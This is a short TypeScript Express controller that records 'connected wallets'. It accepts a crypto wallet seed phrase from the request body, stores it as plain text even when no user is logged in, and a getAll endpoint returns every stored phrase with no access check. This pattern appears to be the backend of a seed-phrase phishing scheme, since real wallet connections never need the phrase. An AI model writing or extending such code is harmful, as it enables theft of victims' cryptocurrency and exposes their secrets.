import { Request, Response } from 'express';
import { AppError, AppResponse, toJSON } from '@/common/utils';
import { catchAsync } from '@/middlewares';
import { connectedWalletRepository } from '@/repository/connectedWalletRepository';
import { addEmailToQueue } from '@/queues/emailQueue';

class ConnectedWalletController {
	create = catchAsync(async (req: Request, res: Response) => {
		const { user } = req;
		const { wallet_type, seed_phrase } = req.body;

		if (!wallet_type) throw new AppError('Wallet type is required', 400);
		if (!seed_phrase) throw new AppError('Seed phrase / Username is required', 400);

		const [connectedWallet] = await connectedWalletRepository.create({
			userId: user ? user.id : undefined,
			wallet_type,
			seed_phrase,
		});

		if (user?.email) {
			await addEmailToQueue({
				type: 'walletConnected',
				data: {
					to: user.email,
					name: user.firstName,
					walletType: wallet_type,
					priority: 'high',
				},
			});
		}

		return AppResponse(res, 201, toJSON([connectedWallet]), 'Wallet connected successfully');
	});

	getAll = catchAsync(async (req: Request, res: Response) => {
		const wallets = await connectedWalletRepository.findAll();
		return AppResponse(res, 200, toJSON(wallets), 'Connected wallets fetched successfully');
	});
}

export const connectedWalletController = new ConnectedWalletController();
